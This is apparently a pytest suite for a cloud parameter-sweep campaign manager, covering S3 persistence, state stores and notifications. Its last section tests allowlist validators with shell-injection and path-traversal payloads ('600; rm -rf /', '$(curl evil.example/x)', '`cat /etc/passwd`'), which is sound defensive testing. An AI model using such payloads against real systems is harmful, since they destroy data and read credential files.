"""
Tests for ``scripts/cloud_campaign_manager.py`` — Issue #1847.

Coverage targets the public surface and the JSON dataclass round-trips
that drive every consumer (workers, aggregator, SNS, webhook, email).
The cloud module is intentionally mocked (see ``conftest.fake_aws_clients``).
"""

from __future__ import annotations

import argparse
import json
import urllib.error
from dataclasses import asdict
from datetime import datetime, timezone
from unittest.mock import MagicMock

# Scripts/ is on sys.path via conftest.
import cloud_campaign_manager as ccm
import pytest

# ---------------------------------------------------------------------------
# Fixtures local to this file.
# ---------------------------------------------------------------------------


@pytest.fixture
def campaign_config() -> ccm.CampaignConfig:
    return ccm.CampaignConfig(
        case_id="600",
        sweep_type=ccm.SweepType.RANDOM,
        parameters=[
            ccm.ParameterSpec(
                "R_value", default=2.0, min_val=1.0, max_val=2.5, step=0.5, unit="m²K/W"
            ),
            ccm.ParameterSpec(
                "wall_thickness",
                default=0.15,
                min_val=0.10,
                max_val=0.20,
                step=0.05,
                unit="m",
            ),
        ],
        max_iterations=4,
        samples_per_param=4,
    )


@pytest.fixture
def base_state(campaign_config) -> ccm.CampaignState:
    return ccm.CampaignState(
        campaign_id="fluxion-camp-abc1234567",
        config={"case_id": campaign_config.case_id},
        work_units=[{"work_unit_id": "wu-0000"}] * 4,
        status="created",
        start_time=datetime.now(timezone.utc).isoformat(),
    )


# ---------------------------------------------------------------------------
# Data-class round-trip & serialization (Issue #1847 Task 2 bullet 1).
# ---------------------------------------------------------------------------


def test_campaign_state_round_trip_preserves_fields(base_state):
    """``CampaignState(**asdict(state))`` must round-trip losslessly."""
    base_state.best_mae = 1.234
    base_state.best_parameters = {"R_value": 2.5, "wall_thickness": 0.15}
    base_state.completed_units = 3
    base_state.failed_units = 1
    base_state.webhook_url = "https://example.test/hook"
    base_state.sns_topic_arn = "arn:aws:sns:us-east-1:0:test"
    base_state.email_config = {"from": "noreply@test", "to": ["ops@test"], "cc": []}

    snapshot = asdict(base_state)
    restored = ccm.CampaignState(**snapshot)

    assert restored.campaign_id == base_state.campaign_id
    assert restored.status == "created"
    assert restored.best_mae == pytest.approx(1.234)
    assert restored.best_parameters == {"R_value": 2.5, "wall_thickness": 0.15}
    assert restored.completed_units == 3
    assert restored.failed_units == 1
    assert restored.webhook_url == "https://example.test/hook"
    assert restored.sns_topic_arn == "arn:aws:sns:us-east-1:0:test"
    assert restored.email_config["from"] == "noreply@test"
    assert restored.notification_sent is False


def test_campaign_state_json_round_trip(base_state):
    """Real serialization through ``json.dumps`` / ``json.loads``."""
    base_state.best_parameters = {"alpha": 0.1, "beta": 99.9}
    payload = json.loads(json.dumps(asdict(base_state), default=str))
    assert payload["best_parameters"]["alpha"] == 0.1
    # notification_sent defaults to False and survives serialization.
    assert payload["notification_sent"] is False
    # Optional fields default to None.
    assert payload["end_time"] is None


def test_campaign_state_optional_fields_default_to_none():
    state = ccm.CampaignState(
        campaign_id="c",
        config={},
        work_units=[],
        status="created",
        start_time="t0",
    )
    assert state.end_time is None
    assert state.error_message is None
    assert state.webhook_url is None
    assert state.sns_topic_arn is None
    assert state.email_config is None
    assert state.results_uri is None
    assert state.best_parameters == {}
    assert state.best_mae == 999.0


# ---------------------------------------------------------------------------
# Sweep-config validation (Issue #1847 Task 2 bullet 1).
# ---------------------------------------------------------------------------


def test_generate_grid_points_full_factorial():
    specs = [
        ccm.ParameterSpec("a", default=1.0, min_val=0.0, max_val=2.0, step=1.0),
        ccm.ParameterSpec("b", default=1.0, min_val=10.0, max_val=12.0, step=1.0),
    ]
    points = ccm.generate_grid_points(specs)
    # 3 a-values * 3 b-values = 9 combinations
    assert len(points) == 9
    seen_pairs = {(round(p["a"], 6), round(p["b"], 6)) for p in points}
    assert seen_pairs == {
        (0.0, 10.0),
        (0.0, 11.0),
        (0.0, 12.0),
        (1.0, 10.0),
        (1.0, 11.0),
        (1.0, 12.0),
        (2.0, 10.0),
        (2.0, 11.0),
        (2.0, 12.0),
    }


def test_generate_random_points_respects_bounds():
    specs = [
        ccm.ParameterSpec("low_high", default=0.5, min_val=0.0, max_val=1.0, step=0.1),
    ]
    points = ccm.generate_random_points(specs, samples=50)
    assert len(points) == 50
    for point in points:
        assert 0.0 <= point["low_high"] <= 1.0


def test_generate_grid_points_handles_floating_point_quantization():
    """``0.1`` step accumulates ~ ``max_val`` exactly through epsilon tolerance."""
    specs = [ccm.ParameterSpec("x", default=0.0, min_val=0.0, max_val=1.0, step=0.3)]
    points = ccm.generate_grid_points(specs)
    # 0.0, 0.3, 0.6, 0.9 → 4 stops (1.0 is not strictly <= 1.0+eps from 0.9+0.3=1.2)
    assert len(points) == 4
    assert all("x" in p for p in points)


# ---------------------------------------------------------------------------
# S3 URIs, env-var helpers, prefix plumbing (Issue #1847 Task 2 bullet 3).
# ---------------------------------------------------------------------------


def test_parse_s3_uri_valid():
    bucket, key = ccm.parse_s3_uri("s3://my-bucket/foo/bar/baz.json")
    assert bucket == "my-bucket"
    assert key == "foo/bar/baz.json"


def test_parse_s3_uri_no_key_returns_empty_string():
    bucket, key = ccm.parse_s3_uri("s3://my-bucket")
    assert bucket == "my-bucket"
    assert key == ""


def test_parse_s3_uri_rejects_non_s3_scheme():
    with pytest.raises(ValueError, match="Invalid S3 URI"):
        ccm.parse_s3_uri("https://example.com/foo")


def test_get_required_env_returns_value(monkeypatch):
    monkeypatch.setenv("FLUXION_REQUIRED", "secret-value")
    assert ccm.get_required_env("FLUXION_REQUIRED") == "secret-value"


def test_get_required_env_raises_when_unset(monkeypatch):
    monkeypatch.delenv("FLUXION_REQUIRED", raising=False)
    with pytest.raises(ValueError, match="FLUXION_REQUIRED"):
        ccm.get_required_env("FLUXION_REQUIRED")


def test_parse_email_recipients_handles_separators_and_whitespace():
    assert ccm.parse_email_recipients("a@x,b@x ; c@x,,,d@x") == [
        "a@x",
        "b@x",
        "c@x",
        "d@x",
    ]


def test_parse_email_recipients_empty_returns_empty_list():
    assert ccm.parse_email_recipients("") == []
    assert ccm.parse_email_recipients("   ") == []
    assert ccm.parse_email_recipients(None) == []  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# create_campaign: mocked S3 work-unit + state persistence (bullet 3).
# ---------------------------------------------------------------------------


def test_create_campaign_generates_work_units_and_persists(
    monkeypatch, fake_aws_clients, campaign_config
):
    state = ccm.create_campaign(
        campaign_config,
        s3_bucket="fluxion-test-bucket",
        s3_prefix="fluxion/test",
        sns_topic_arn="arn:aws:sns:us-east-1:0:test",
        webhook_url="https://example.test/hook",
        email_config={"from": "noreply@test", "to": ["ops@test"], "cc": []},
    )

    # Campaign id is deterministic-format: "fluxion-" + 12 hex
    assert state.campaign_id.startswith("fluxion-")
    assert len(state.campaign_id.removeprefix("fluxion-")) == 12
    # Up to max_iterations work units are emitted
    assert len(state.work_units) == min(
        campaign_config.max_iterations,
        campaign_config.samples_per_param,
    )
    assert state.status == "created"
    assert state.webhook_url == "https://example.test/hook"
    assert state.sns_topic_arn == "arn:aws:sns:us-east-1:0:test"
    assert state.email_config["from"] == "noreply@test"

    # S3 mock got one put_object per work unit + one for the state.json blob.
    s3_puts = fake_aws_clients["s3"].bucket_objects["fluxion-test-bucket"]
    work_unit_keys = [k for k in s3_puts if "/work-units/" in k]
    state_keys = [k for k in s3_puts if k.endswith("/state.json")]
    assert len(work_unit_keys) == len(state.work_units)
    assert len(state_keys) == 1
    # Each work-unit body is valid JSON of the WorkUnit dataclass.
    for key in work_unit_keys:
        body = json.loads(s3_puts[key].decode("utf-8"))
        assert body["campaign_id"] == state.campaign_id
        assert body["case_id"] == "600"
        assert isinstance(body["parameters"], dict)


def test_create_campaign_grid_sweep_uses_grid_points(monkeypatch, fake_aws_clients):
    config = ccm.CampaignConfig(
        case_id="600",
        sweep_type=ccm.SweepType.GRID,
        parameters=[
            ccm.ParameterSpec(
                "R_value", default=2.0, min_val=1.0, max_val=2.0, step=1.0
            ),
            ccm.ParameterSpec(
                "wall_thickness", default=0.15, min_val=0.10, max_val=0.20, step=0.05
            ),
        ],
        max_iterations=10,
    )
    state = ccm.create_campaign(config, s3_bucket="b", s3_prefix="p")
    # Grid: 2 R-values * 3 thickness-values = 6 combos, capped at max_iterations=10.
    assert len(state.work_units) == 6


def test_create_campaign_uses_max_iterations_when_no_random(
    campaign_config, fake_aws_clients
):
    """``BINARY`` falls into the default branch: ``generate_random_points(..., max_iterations)``."""
    campaign_config.sweep_type = ccm.SweepType.BINARY
    campaign_config.samples_per_param = 2
    campaign_config.max_iterations = 5
    state = ccm.create_campaign(campaign_config, s3_bucket="b", s3_prefix="p")
    assert len(state.work_units) == 5


# ---------------------------------------------------------------------------
# update_campaign_state (delta-file application — Issue #1847 Task 2 bullet 3).
# ---------------------------------------------------------------------------


def test_update_campaign_state_overwrites_state_blob(fake_aws_clients, base_state):
    base_state.completed_units = 2
    base_state.failed_units = 1
    base_state.status = "running"
    ccm.update_campaign_state(base_state, "bucket-a", "prefix-a")

    s3 = fake_aws_clients["s3"]
    state_key = "prefix-a/campaigns/fluxion-camp-abc1234567/state.json"
    assert state_key in s3.bucket_objects["bucket-a"]
    body = json.loads(s3.bucket_objects["bucket-a"][state_key].decode("utf-8"))
    assert body["completed_units"] == 2
    assert body["failed_units"] == 1
    assert body["status"] == "running"


# ---------------------------------------------------------------------------
# check_campaign_progress (state-store + S3 fallback paths).
# ---------------------------------------------------------------------------


def test_check_campaign_progress_via_in_memory_state_store(
    in_memory_state_store,
    fake_aws_clients,
    base_state,
):
    """In-memory state-store path is authoritative when populated.

    The test populates the store directly so the work units match
    ``base_state.campaign_id`` and the aggregate query returns non-zero
    counts.
    """
    from state_store import TaskState, TaskStatus

    base_state.work_units = [{"work_unit_id": f"wu-{i:04d}"} for i in range(5)]
    for i, status in enumerate(
        [
            TaskStatus.COMPLETED,
            TaskStatus.COMPLETED,
            TaskStatus.COMPLETED,
            TaskStatus.FAILED,
            TaskStatus.RUNNING,
        ]
    ):
        in_memory_state_store.set_state(
            TaskState(
                work_unit_id=f"wu-{i:04d}",
                campaign_id=base_state.campaign_id,
                status=status,
                metrics={"heating_mae": 1.2 + i * 0.1}
                if status == TaskStatus.COMPLETED
                else {},
                timestamp="2026-01-01T00:00:00Z",
            )
        )
    after = ccm.check_campaign_progress(
        base_state, "bucket", "prefix", state_store=in_memory_state_store
    )
    # 3 completed, 1 failed, 1 in-flight (running).
    assert after.completed_units == 3
    assert after.failed_units == 1
    # status was "created", in_flight > 0 → "running"
    assert after.status == "running"


def test_check_campaign_progress_via_s3_listing(fake_aws_clients, base_state):
    """Legacy S3-fallback counts ``results/*.json`` blobs."""
    base_state.work_units = [{"work_unit_id": f"wu-{i:04d}"} for i in range(4)]
    fake_aws_clients["s3"].listed_objects["bucket-a"] = [
        {"Key": "prefix/results/wu-0000.json"},
        {"Key": "prefix/results/wu-0001.json"},
        {"Key": "prefix/results/wu-failed-0002.json"},
        {"Key": "prefix/results/_placeholder"},  # ignored by filter
    ]
    after = ccm.check_campaign_progress(base_state, "bucket-a", "prefix")
    assert after.completed_units == 2
    assert after.failed_units == 1


def test_check_campaign_progress_zero_work_units_no_division_error(
    base_state,
    fake_aws_clients,
):
    """Zero work units should not divide-by-zero in the progress-pct calculation.

    The S3-listing fallback is exercised when ``state_store`` is None, so we
    need our mocked AWS clients available to avoid a real network call.
    """
    base_state.work_units = []
    after = ccm.check_campaign_progress(base_state, "b", "p", state_store=None)
    assert after.completed_units == 0
    assert after.failed_units == 0
    assert after.status == "created"


def test_check_campaign_progress_marks_completed_when_state_store_reports_full(
    in_memory_state_store,
    fake_aws_clients,
    base_state,
):
    from state_store import TaskState, TaskStatus

    base_state.work_units = [{"work_unit_id": f"wu-{i:04d}"} for i in range(5)]
    # Mark all 5 work units completed so the state-store reports full progress.
    for i in range(5):
        in_memory_state_store.set_state(
            TaskState(
                work_unit_id=f"wu-{i:04d}",
                campaign_id=base_state.campaign_id,
                status=TaskStatus.COMPLETED,
                metrics={},
                timestamp=f"2026-01-01T00:00:0{i}Z",
            )
        )
    after = ccm.check_campaign_progress(
        base_state, "b", "p", state_store=in_memory_state_store
    )
    assert after.status == "completed"


# ---------------------------------------------------------------------------
# build_completion_payload + email rendering.
# ---------------------------------------------------------------------------


def test_build_completion_payload_has_results_uri(base_state):
    base_state.best_mae = 2.345
    base_state.best_parameters = {"R_value": 2.5}
    payload = ccm.build_completion_payload(base_state, "my-bucket", "my-prefix")
    assert payload["campaign_id"] == base_state.campaign_id
    assert payload["best_mae"] == 2.345
    assert payload["best_parameters"] == {"R_value": 2.5}
    assert payload["results_uri"].startswith("https://my-bucket.s3.")
    assert payload["results_uri"].endswith(
        f"/campaigns/{base_state.campaign_id}/results/"
    )


def test_render_email_subject_uses_status(base_state):
    payload = ccm.build_completion_payload(base_state, "b", "p")
    assert "completed" in ccm.render_email_subject(payload)
    payload["status"] = "failed"
    assert "failed" in ccm.render_email_subject(payload)


def test_render_email_body_includes_download_url(base_state):
    payload = ccm.build_completion_payload(base_state, "b", "p")
    body = ccm.render_email_body(payload, download_url="https://signed.example/r")
    assert "https://signed.example/r" in body
    assert "Fluxion campaign" in body
    assert "Best MAE:" in body


def test_render_email_body_empty_best_params_renders_placeholder(base_state):
    base_state.best_parameters = {}
    payload = ccm.build_completion_payload(base_state, "b", "p")
    body = ccm.render_email_body(payload)
    assert "(none)" in body


# ---------------------------------------------------------------------------
# send_webhook_notification / send_email_notification / send_completion_notification.
# ---------------------------------------------------------------------------


def test_send_webhook_2xx_returns_true(base_state, fake_urlopen):
    fake_urlopen["install"](status=200)
    ok = ccm.send_webhook_notification(base_state, "b", "p", "https://hook.test/x")
    assert ok is True
    assert len(fake_urlopen["calls"]) == 1
    body = fake_urlopen["calls"][0].data.decode("utf-8")
    payload = json.loads(body)
    assert payload["campaign_id"] == base_state.campaign_id


def test_send_webhook_5xx_returns_false(base_state, fake_urlopen):
    fake_urlopen["install"](status=500)
    assert (
        ccm.send_webhook_notification(base_state, "b", "p", "https://hook.test/x")
        is False
    )


def test_send_webhook_url_error_returns_false(base_state, fake_urlopen):
    fake_urlopen["install"](raises=urllib.error.URLError("nope"))
    assert (
        ccm.send_webhook_notification(base_state, "b", "p", "https://hook.test/x")
        is False
    )


def test_send_email_2xx_returns_true(base_state, fake_urlopen):
    fake_urlopen["install"](status=202)
    cfg = {
        "from": "noreply@test",
        "to": ["ops@test"],
        "api_endpoint": "https://api.test/send",
    }
    assert ccm.send_email_notification(base_state, "b", "p", cfg) is True
    # Envelope contains the rendered subject and body.
    body = json.loads(fake_urlopen["calls"][0].data.decode("utf-8"))
    assert body["to"] == ["ops@test"]
    assert (
        "started" in body["subject"].lower() or "completed" in body["subject"].lower()
    )
    assert "Fluxion campaign" in body["body_text"]


def test_send_email_includes_x_fluxion_campaign_id_header(base_state, fake_urlopen):
    fake_urlopen["install"](status=200)
    cfg = {
        "from": "noreply@test",
        "to": ["ops@test"],
        "api_endpoint": "https://api.test/send",
    }
    ccm.send_email_notification(base_state, "b", "p", cfg)
    headers = fake_urlopen["calls"][0].headers
    assert (
        headers.get("X-fluxion-campaign-id") == base_state.campaign_id
        or headers.get("X-Fluxion-Campaign-Id") == base_state.campaign_id
    )


def test_send_email_5xx_returns_false(base_state, fake_urlopen):
    fake_urlopen["install"](status=503)
    cfg = {"from": "f@t", "to": ["x@t"], "api_endpoint": "https://api"}
    assert ccm.send_email_notification(base_state, "b", "p", cfg) is False


def test_send_email_missing_endpoint_does_not_raise(base_state, fake_urlopen):
    """``KeyError`` on ``api_endpoint`` is swallowed and returns False."""
    cfg = {"from": "f@t", "to": ["x@t"]}  # no api_endpoint
    assert ccm.send_email_notification(base_state, "b", "p", cfg) is False


def test_send_completion_notification_no_channels_logs_warning(
    base_state, fake_aws_clients, capsys
):
    base_state.notification_sent = False
    ccm.send_completion_notification(base_state, "b", "p")
    out = capsys.readouterr().err
    assert "No notification channel" in out
    # state untouched.
    assert base_state.notification_sent is False


def test_send_completion_notification_idempotent(
    base_state, fake_aws_clients, capsys, fake_urlopen
):
    base_state.notification_sent = True
    ccm.send_completion_notification(base_state, "b", "p", webhook_url="https://hook")
    assert "already sent" in capsys.readouterr().out
    # URL was not called.
    assert fake_urlopen["calls"] == []


def test_send_completion_notification_webhook_failure_keeps_state_unflagged(
    base_state,
    fake_urlopen,
    fake_aws_clients,
    capsys,
):
    fake_urlopen["install"](status=500)
    ccm.send_completion_notification(
        base_state, "b", "p", webhook_url="https://hook.test/x"
    )
    assert base_state.notification_sent is False
    s3 = fake_aws_clients["s3"]
    state_key = "p/campaigns/fluxion-camp-abc1234567/state.json"
    assert state_key in s3.bucket_objects["b"]  # state blob re-persisted


def test_send_completion_notification_sns_2xx_marks_success(
    base_state,
    fake_aws_clients,
):
    base_state.notification_sent = False
    ccm.send_completion_notification(
        base_state, "b", "p", sns_topic_arn="arn:aws:sns:us-east-1:0:test"
    )
    sns = fake_aws_clients["sns"]
    assert len(sns.published) == 1
    assert sns.published[0]["TopicArn"] == "arn:aws:sns:us-east-1:0:test"
    assert base_state.notification_sent is True


def test_send_completion_notification_email_2xx_marks_success(
    base_state,
    fake_urlopen,
    fake_aws_clients,
):
    fake_urlopen["install"](status=202)
    cfg = {"from": "f@t", "to": ["x@t"], "api_endpoint": "https://api"}
    ccm.send_completion_notification(base_state, "b", "p", email_config=cfg)
    assert base_state.notification_sent is True


# ---------------------------------------------------------------------------
# build_email_config_from_args / build_default_params.
# ---------------------------------------------------------------------------


def test_build_email_config_from_args_returns_none_without_recipients():
    args = MagicMock()
    args.email_to = ""
    args.email_cc = ""
    args.email_from = ""
    args.email_api_endpoint = None
    args.email_api_auth = None
    args.email_download_url = None
    assert ccm.build_email_config_from_args(args) is None


def test_build_email_config_from_args_populates_all_fields():
    args = MagicMock()
    args.email_to = "a@x, b@x"
    args.email_cc = "c@x"
    args.email_from = "fluxion@example"
    args.email_api_endpoint = "https://api/send"
    args.email_api_auth = "Bearer SG.x"
    args.email_download_url = "https://signed/dl"
    cfg = ccm.build_email_config_from_args(args)
    assert cfg["to"] == ["a@x", "b@x"]
    assert cfg["from"] == "fluxion@example"
    assert cfg["cc"] == ["c@x"]
    assert cfg["api_endpoint"] == "https://api/send"
    assert cfg["api_auth_header"] == "Bearer SG.x"
    assert cfg["download_url_override"] == "https://signed/dl"


def test_build_default_params_contains_known_keys():
    p = ccm.build_default_params()
    assert set(p.keys()) == {"R_value", "wall_thickness", "thermal_mass", "h_tr_is"}
    assert p["R_value"].unit == "m²K/W"
    assert p["h_tr_is"].default == 8.29


# ---------------------------------------------------------------------------
# get_campaign_state: 404 → None, missing key → None.
# ---------------------------------------------------------------------------


def test_get_campaign_state_returns_none_on_missing(fake_aws_clients):
    fake_aws_clients["s3"].bucket_objects.setdefault("b", {})  # empty bucket
    assert ccm.get_campaign_state("missing", "b", "p") is None


def test_get_campaign_state_round_trips_existing_state(fake_aws_clients, base_state):
    serialized = json.dumps(asdict(base_state), default=str).encode("utf-8")
    fake_aws_clients["s3"].bucket_objects["b"] = {
        "p/campaigns/fluxion-camp-abc1234567/state.json": serialized
    }
    restored = ccm.get_campaign_state(base_state.campaign_id, "b", "p")
    assert restored is not None
    assert restored.campaign_id == base_state.campaign_id
    assert restored.status == "created"


def test_get_campaign_state_propagates_non_404_client_error(fake_aws_clients):
    from botocore.exceptions import ClientError

    s3 = fake_aws_clients["s3"]
    # Override the S3 client to raise a non-404 ClientError.
    s3.get_object = MagicMock(
        side_effect=ClientError(
            {
                "Error": {"Code": "AccessDenied", "Message": "no"},
                "ResponseMetadata": {"HTTPStatusCode": 403},
            },
            "GetObject",
        )
    )
    with pytest.raises(ClientError):
        ccm.get_campaign_state("x", "b", "p")


# ---------------------------------------------------------------------------
# ensure_s3_prefix creates a placeholder on miss, skips on hit.
# ---------------------------------------------------------------------------


def test_ensure_s3_prefix_strips_trailing_slash(fake_aws_clients):
    ccm.ensure_s3_prefix(fake_aws_clients["s3"], "b", "trailing/")
    # We pass through ClientError path (head fails) → put fires for "trailing/_placeholder".
    s3 = fake_aws_clients["s3"]
    assert "trailing/_placeholder" in s3.bucket_objects["b"]


def test_ensure_s3_prefix_skips_put_when_head_succeeds(fake_aws_clients):
    fake_aws_clients["s3"].head_should_fail = False
    fake_aws_clients["s3"].bucket_objects.setdefault("b", {})["p/_placeholder"] = b""
    ccm.ensure_s3_prefix(fake_aws_clients["s3"], "b", "p")
    # put not called (only the existing entry present, no size change tracked here, but
    # we can prove no double-write by clearing first then calling with head success).
    fake_aws_clients["s3"].bucket_objects["b"].clear()
    fake_aws_clients["s3"].bucket_objects["b"]["p/_placeholder"] = b""
    s3_put_count_before = len(fake_aws_clients["s3"].bucket_objects["b"])
    ccm.ensure_s3_prefix(fake_aws_clients["s3"], "b", "p")
    assert len(fake_aws_clients["s3"].bucket_objects["b"]) == s3_put_count_before


# ---------------------------------------------------------------------------
# trigger_aggregator — both branches.
# ---------------------------------------------------------------------------


def test_trigger_aggregator_lambda_branch(fake_aws_clients):
    out = ccm.trigger_aggregator(
        campaign_id="cid",
        s3_bucket="bucket-x",
        s3_prefix="prefix-x",
        aggregator_function_name="agg-fn",
    )
    assert out == "s3://bucket-x/prefix-x/campaigns/cid/results/"
    lambda_client = fake_aws_clients["lambda"]
    lambda_client.invoke.assert_called_once()
    kwargs = lambda_client.invoke.call_args.kwargs
    assert kwargs["FunctionName"] == "agg-fn"


def test_trigger_aggregator_no_function_returns_results_uri(fake_aws_clients):
    out = ccm.trigger_aggregator(campaign_id="cid", s3_bucket="b", s3_prefix="p")
    assert out.startswith("s3://b/p/campaigns/cid/results/")


# ---------------------------------------------------------------------------
# _resolve_state_store — branches covering "auto / memory / dynamo / unknown".
# ---------------------------------------------------------------------------


def test_resolve_state_store_memory(monkeypatch):
    monkeypatch.setenv("FLUXION_STATE_STORE", "memory")
    store = ccm._resolve_state_store("memory")
    assert store is not None
    # ``backend_name`` is exposed as a property/attribute, not a callable, on
    # some StateStore implementations; the canonical interface is duck-typed,
    # so just check the type.
    assert store.__class__.__name__ in {"InMemoryStateStore", "MemoryStateStore"}


def test_resolve_state_store_auto_falls_back_to_none(monkeypatch):
    monkeypatch.delenv("FLUXION_STATE_STORE", raising=False)
    monkeypatch.delenv("FLUXION_CAMPAIGN_TABLE", raising=False)
    monkeypatch.delenv("FLUXION_REDIS_URL", raising=False)
    assert ccm._resolve_state_store("auto") is None


def test_resolve_state_store_unknown_returns_none(monkeypatch):
    """An unrecognised selection yields None (the no-state-store fallback)."""
    # Use a string the dispatcher doesn't know, regardless of env state.
    monkeypatch.delenv("FLUXION_STATE_STORE", raising=False)
    monkeypatch.delenv("FLUXION_CAMPAIGN_TABLE", raising=False)
    monkeypatch.delenv("FLUXION_REDIS_URL", raising=False)
    assert ccm._resolve_state_store("terraform") is None


def test_resolve_state_store_auto_redis_when_redis_url(monkeypatch):
    """Auto-dispatch should fall through to redis when ``FLUXION_REDIS_URL`` is set."""
    monkeypatch.delenv("FLUXION_STATE_STORE", raising=False)
    monkeypatch.delenv("FLUXION_CAMPAIGN_TABLE", raising=False)
    monkeypatch.setenv("FLUXION_REDIS_URL", "redis://localhost:6379/0")
    # The redis backend construction may fail without a server; the helper
    # catches that and returns None — both outcomes prove the code path.
    assert (
        ccm._resolve_state_store("auto") is None
        or ccm._resolve_state_store("auto").__class__.__name__ == "RedisStateStore"
    )


# ---------------------------------------------------------------------------
# Issue #1791 — T8.1 reproducer no longer triggers the lock
# ---------------------------------------------------------------------------


def test_concurrent_workers_complete_without_lock_issue_1791():
    """The T8.1 sqlite_lock_race_reproducer documented SQLite SQLITE_BUSY under
    high writer contention. After the T7.3 / #1791 migration to the
    ``StateStore`` abstraction, the same fan-out completes without any
    "database is locked" error.

    16 workers × 50 writes each (= 800 publishes) through the in-memory
    state-store must succeed and the aggregated progress must equal 800/800.
    """
    import threading

    from state_store import InMemoryStateStore, TaskState, TaskStatus

    store = InMemoryStateStore()
    errors: list[BaseException] = []
    workers = 16
    writes_per_worker = 50
    campaign_id = "issue-1791-concurrency"

    def worker(worker_id: int) -> None:
        try:
            for i in range(writes_per_worker):
                work_unit_id = f"w{worker_id:02d}-t{i:03d}"
                store.set_state(
                    TaskState.now(
                        campaign_id=campaign_id,
                        work_unit_id=work_unit_id,
                        status=TaskStatus.COMPLETED,
                    )
                )
        except BaseException as exc:  # pragma: no cover - threaded
            errors.append(exc)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == [], f"Concurrent state-store writes raised: {errors!r}"
    states = store.list_states(campaign_id)
    assert len(states) == workers * writes_per_worker
    assert all(s.status == TaskStatus.COMPLETED for s in states)


# ---------------------------------------------------------------------------
# Issue #3449 — workflow_dispatch input allowlist validators.
#
# These tests pin the security contract: every value that can be set via
# `.github/workflows/cloud_campaign.yml` (which is workflow_dispatch-only,
# write-access users) is rejected by the validators below if it could
# trigger shell injection, AWS API misuse, or path traversal in the
# downstream coordinator.
# ---------------------------------------------------------------------------


def _dispatch_namespace(**overrides):
    """Build an argparse.Namespace that passes `validate_dispatch_inputs` by default.

    Tests override individual fields to assert rejection / acceptance. Any
    new validator added to `validate_dispatch_inputs` must extend the
    defaults here or these tests will start failing for the wrong reason.
    """
    defaults = dict(
        case="600",
        params=None,
        sweep_type="random",
        samples=50,
        s3_bucket="fluxion-test-bucket",
        s3_prefix="fluxion/test",
        sns_topic=None,
    )
    defaults.update(overrides)
    return argparse.Namespace(**defaults)


def test_validate_case_id_accepts_ashrae_range():
    """ASHRAE 140 case IDs span 3-4 digit decimal numbers."""
    for value in ("600", "800", "900", "1200"):
        assert ccm.validate_case_id(value) == value


def test_validate_case_id_rejects_injection_attempts():
    """`workflow_dispatch` is privileged but the validator must still reject
    shell-metacharacter payloads even if a maintainer is socially engineered
    into dispatching one (the original Issue #3449 threat model)."""
    for bad in (
        "600; rm -rf /",
        "$(curl evil.example/x)",
        "`cat /etc/passwd`",
        "600\n",
        "",
        "60",  # too short
        "12345",  # too long
        "abc",
        "600 ",
        " 600",
    ):
        with pytest.raises(ValueError, match="Invalid case_id"):
            ccm.validate_case_id(bad)


def test_validate_params_accepts_known_names():
    """The built-in parameter names plus any valid identifier are allowed."""
    out = ccm.validate_params("R_value,wall_thickness,thermal_mass,h_tr_is")
    assert out == ["R_value", "wall_thickness", "thermal_mass", "h_tr_is"]
    # Single name + comma-separated unknown-but-valid identifiers
    assert ccm.validate_params("custom_param") == ["custom_param"]


def test_validate_params_rejects_shell_metachars_and_traversal():
    """Issue #3449 — ``--params`` is a free-text input; without validation it
    is a shell-injection vector."""
    for bad in (
        "",
        "a;b",
        "$(whoami)",
        "`cat /etc/passwd`",
        "../etc/passwd",
        "R_value,evil param",
        ",R_value",
        "R_value,",
    ):
        with pytest.raises(ValueError):
            ccm.validate_params(bad)


def test_validate_s3_bucket_accepts_dns_compliant_names():
    for name in ("my-bucket", "fluxion.test-bucket", "abc", "a" * 63):
        assert ccm.validate_s3_bucket(name) == name


def test_validate_s3_bucket_rejects_unsafe_names():
    """Uppercase, underscores, leading dashes, and adjacent dots are invalid
    per AWS naming rules; the validator rejects them as well."""
    for bad in (
        "Bucket_With_Underscore",
        "../etc",
        "-leading-dash",
        "trailing-dash-",
        "BUCKET",
        "a",
        "a" * 64,
        "Bucket..DoubleDot",
    ):
        with pytest.raises(ValueError, match="Invalid s3 bucket name"):
            ccm.validate_s3_bucket(bad)


def test_validate_s3_prefix_accepts_safe_prefixes():
    for prefix in ("", "fluxion-campaigns", "fluxion/test", "a/b/c/d"):
        assert ccm.validate_s3_prefix(prefix) == prefix


def test_validate_s3_prefix_rejects_traversal_and_metachars():
    """Path traversal (`..`) and shell metacharacters must be rejected."""
    for bad in (
        "../etc/passwd",
        "..",
        "fluxion/../etc",
        "a/../b",
        "a;b",
        "a b",
        "$(whoami)",
        "/abs/leading-slash",
        "trailing/",
        "//double-slash",
    ):
        with pytest.raises(ValueError, match="Invalid s3 prefix"):
            ccm.validate_s3_prefix(bad)


def test_validate_sns_topic_accepts_valid_arn_and_empty():
    assert (
        ccm.validate_sns_topic("arn:aws:sns:us-east-1:123456789012:test-topic")
        == "arn:aws:sns:us-east-1:123456789012:test-topic"
    )
    # Empty string means "no SNS topic configured" and is allowed.
    assert ccm.validate_sns_topic("") == ""


def test_validate_sns_topic_rejects_non_arn_strings():
    for bad in (
        "https://example.com/topic",
        "arn:aws:s3:::bucket",
        "arn:EVIL",
        "arn:aws:sns:us-east-1:abc:not-a-number-account",
    ):
        with pytest.raises(ValueError, match="Invalid sns topic arn"):
            ccm.validate_sns_topic(bad)


def test_validate_samples_rejects_non_positive():
    for bad in (0, -1, -100):
        with pytest.raises(ValueError, match="Invalid samples"):
            ccm.validate_samples(bad)


def test_validate_samples_accepts_positive_integers_and_str_digits():
    assert ccm.validate_samples(1) == 1
    assert ccm.validate_samples(1000) == 1000
    assert ccm.validate_samples("42") == 42


def test_validate_samples_rejects_non_numeric():
    with pytest.raises(ValueError, match="Invalid samples"):
        ccm.validate_samples("not-a-number")


def test_validate_dispatch_inputs_accepts_clean_namespace():
    """The default namespace passes."""
    ccm.validate_dispatch_inputs(_dispatch_namespace())


@pytest.mark.parametrize(
    "field,bad_value",
    [
        ("case", "600; rm -rf /"),
        ("params", "a;b"),
        ("samples", 0),
        ("s3_bucket", "Bad_Bucket"),
        ("s3_prefix", "../etc"),
        ("sns_topic", "https://evil.example/x"),
    ],
)
def test_validate_dispatch_inputs_rejects_each_field(field, bad_value):
    """Each allowlist field rejects its malicious value independently."""
    ns = _dispatch_namespace(**{field: bad_value})
    with pytest.raises(ValueError):
        ccm.validate_dispatch_inputs(ns)


